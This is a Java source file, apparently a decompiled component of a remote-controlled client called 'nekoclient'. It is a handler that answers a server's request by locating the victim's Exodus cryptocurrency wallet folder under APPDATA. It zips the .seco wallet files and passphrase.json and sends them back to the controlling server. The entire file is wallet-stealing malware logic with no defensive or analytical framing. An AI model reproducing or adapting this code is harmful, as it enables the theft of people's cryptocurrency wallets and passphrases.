package dev.neko.nekoclient.packet.listener.impl;

import dev.neko.nekoclient.Client;
import dev.neko.nekoclient.packet.impl.client.ExodusResponsePacket;
import dev.neko.nekoclient.packet.impl.server.RequestExodusPacket;
import dev.neko.nekoclient.packet.listener.PacketListener;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Objects;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.stream.Collectors;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class RequestExodusPacketListener implements PacketListener<RequestExodusPacket> {
   public void call(RequestExodusPacket packet, Client client, String id) throws IOException {
      if (Objects.isNull(System.getenv("APPDATA"))) {
         client.send(new ExodusResponsePacket(packet.getNonce(), false, null));
      } else {
         Path wallet = Paths.get(System.getenv("APPDATA"), "Exodus", "exodus.wallet");
         if (!Files.isDirectory(wallet)) {
            client.send(new ExodusResponsePacket(packet.getNonce(), false, null));
         } else {
            ExecutorService executorService = Executors.newSingleThreadExecutor();
            executorService.execute(() -> {
               try {
                  ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                  ZipOutputStream zipOutputStream = new ZipOutputStream(byteArrayOutputStream);

                  for(Path path : Files.walk(wallet, 1).collect(Collectors.toList())) {
                     if (Files.isRegularFile(path) && (path.getFileName().endsWith(".seco") || path.getFileName().toString().equals("passphrase.json"))) {
                        zipOutputStream.putNextEntry(new ZipEntry(path.getFileName().toString()));
                        zipOutputStream.write(Files.readAllBytes(path));
                     }
                  }

                  zipOutputStream.finish();
                  zipOutputStream.close();
                  client.send(new ExodusResponsePacket(packet.getNonce(), true, byteArrayOutputStream.toByteArray()));
                  byteArrayOutputStream.close();
               } catch (IOException var8) {
                  throw new RuntimeException(var8);
               }

               executorService.shutdown();
            });
         }
      }
   }
}
